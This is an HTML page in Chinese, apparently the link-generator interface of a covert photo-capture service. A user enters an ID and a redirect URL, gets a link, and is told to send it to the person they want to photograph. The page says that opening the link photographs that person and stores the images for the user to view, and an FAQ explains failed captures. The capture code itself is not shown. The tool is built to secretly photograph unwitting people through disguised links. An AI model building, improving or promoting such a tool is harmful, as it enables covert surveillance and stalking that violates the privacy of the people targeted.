<!doctype html>
<html lang="zh-cmn-Hans">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" />
    <meta name="renderer" content="webkit" />
    <meta name="force-rendering" content="webkit" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <!-- MDUI CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@1.0.1/dist/css/mdui.min.css" integrity="sha384-cLRrMq39HOZdvE0j6yBojO4+1PrHfB7a9l5qLcmRm/fiWXYY+CndJPmyu5FV/9Tw" crossorigin="anonymous" />
    <title>Hello, world!</title>
</head>

<body class="mdui-theme-primary-blue mdui-theme-accent-blue">
    <script>
        function create() {
            var input = document.getElementById('content');
            var kd = document.getElementById('kd');
            var myid = document.getElementById('myid');
            var url = document.getElementById('url');
            if (myid.value == "" || url.value == "") {
                alert("ID或跳转地址不能为空！");
                return false;
            }
            //a通过创建dom元素用来获取被生成url的绝对路径
            var a = document.createElement('a');
            a.href = "?id=" + myid.value + "&url=" + url.value;
            kd.href = a.href.replace("sc.php", "index.php");
            kd.style = '';
            kd.innerText = a.href.replace("sc.php", "index.php");
        }
    </script>
    <div class="mdui-container">
        <div class="mdui-row">
            <div class="mdui-col-xs-3"></div>
            <div class="mdui-card mdui-col-xs-12 mdui-col-sm-6" style="top: 10px;bottom: -10px">
                <div class="mdui-card-header">
                    <img class="mdui-card-header-avatar" src="https://imzdx.top/wp-content/uploads/2020/11/logo-150x150.jpg" />
                    <div class="mdui-card-header-title">会飞的任性</div>
                    <div class="mdui-card-header-subtitle">拥有最终解释权</div>
                </div>
                <div class="mdui-card-content">
                    <div class="mdui-card">
                        <div class="mdui-card-primary">
                            <div class="mdui-card-primary-title">
                                <p>生成页面</p>
                            </div>
                            <div class="mdui-card-primary-subtitle">
                                <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
                                <p>2.懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
                                <p>3.为节省服务器资源，不定期删除7天前的数据</p>
                            </div>
                        </div>
                    </div>
                    <div class="mdui-card" style="top: 10px;">
                        <div class="mdui-textfield">
                            <i class="mdui-icon material-icons">account_circle</i>
                            <label class="mdui-textfield-label">输入唯一识别ID：</label>
                            <input class="mdui-textfield-input" type="text" id="myid" value='' />
                            <div class="mdui-textfield-helper">建议输入QQ号便于查找</div>
                        </div>
                        <div class="mdui-textfield">
                            <i class="mdui-icon material-icons">link</i>
                            <label class="mdui-textfield-label">拍摄后跳转到：</label>
                            <input class="mdui-textfield-input" type="text" id="url" value='https://www.baidu.com/' />
                            <div class="mdui-textfield-helper">请输入包含http/https的完整链接</div>
                        </div>
                        <div class="mdui-card-actions">
                            <p>
                                <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent" onclick='create();'>生成链接</button>
                                <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-float-right" onclick=window.location.href='ck.php?id='+document.getElementById('myid').value>查看照片 记得填识别ID</button>
                            </p>
                            <div class="mdui-card-primary-title">
                                <p>链接：<a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
                            </div>
                        </div>
                    </div>
                    <div class="mdui-card" style="top: 20px;">
                        <div class="mdui-card-primary">
                            <div class="mdui-card-primary-subtitle">
                                <p>将以上链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存</p>
                                <p>问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接</p>
                                <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mdui-col-xs-3"></div>
        </div>

    </div>
    <!-- MDUI JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/mdui@1.0.1/dist/js/mdui.min.js" integrity="sha384-gCMZcshYKOGRX9r6wbDrvF+TcCCswSHFucUzUPwka+Gr+uHgjlYvkABr95TCOz3A" crossorigin="anonymous"></script>
</body>

</html>